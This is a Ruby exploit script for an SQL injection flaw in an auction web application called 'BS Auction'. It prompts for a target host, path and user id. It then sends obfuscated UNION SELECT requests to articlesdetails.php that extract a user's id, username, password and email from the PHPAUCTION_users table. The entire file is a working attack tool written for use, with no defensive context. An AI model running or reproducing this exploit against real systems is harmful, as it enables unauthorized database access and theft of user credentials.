#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
require 'net/http'
print "
#########################################################
#               4004-Security-Project.com               #
#########################################################
#                   BS Auction SQL Injection            #
#                    Vulnerability Exploit              #
#                    Using Host+Path+userid             #
#                      demo.com /script/ 1              #
#                         Easy Laster                   #
#########################################################
"
block = "#########################################################"
print ""+ block +""
print "\nEnter host name (site.com)->"
host=gets.chomp
print ""+ block +""
print "\nEnter script path (/script/)->"
path=gets.chomp
print ""+ block +""
print "\nEnter userid (userid)->"
userid=gets.chomp
print ""+ block +""
begin
dir = "articlesdetails.php?id=1%27+and+1=0+/**/UnIoN+/**/SeLeCt/**/+1,gRoUp_cOnCat%280x23,0x23,0x23,0x23,0x23,id,0x23,0x23,0x23,0x23,0x23%29,3+/**/from+/**/PHPAUCTION_users/**/+wHeRe+/**/id="+userid+"--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe ID is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "articlesdetails.php?id=1%27+and+1=0+/**/UnIoN+/**/SeLeCt/**/+1,gRoUp_cOnCat%280x23,0x23,0x23,0x23,0x23,name,0x23,0x23,0x23,0x23,0x23%29,3+/**/from+/**/PHPAUCTION_users/**/+wHeRe+/**/id="+userid+"--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe username is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "articlesdetails.php?id=1%27+and+1=0+/**/UnIoN+/**/SeLeCt/**/+1,gRoUp_cOnCat%280x23,0x23,0x23,0x23,0x23,password,0x23,0x23,0x23,0x23,0x23%29,3+/**/from+/**/PHPAUCTION_users/**/+wHeRe+/**/id="+userid+"--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe password is  -> "+(/#####(.+)#####/).match(resp.body)[1]
dir = "articlesdetails.php?id=1%27+and+1=0+/**/UnIoN+/**/SeLeCt/**/+1,gRoUp_cOnCat%280x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23,0x23,0x23%29,3+/**/from+/**/PHPAUCTION_users/**/+wHeRe+/**/id="+userid+"--+"
http = Net::HTTP.new(host, 80)
resp= http.get(path+dir)
print "\nThe email is  -> "+(/#####(.+)#####/).match(resp.body)[1]
rescue
print "\nExploit failed"
end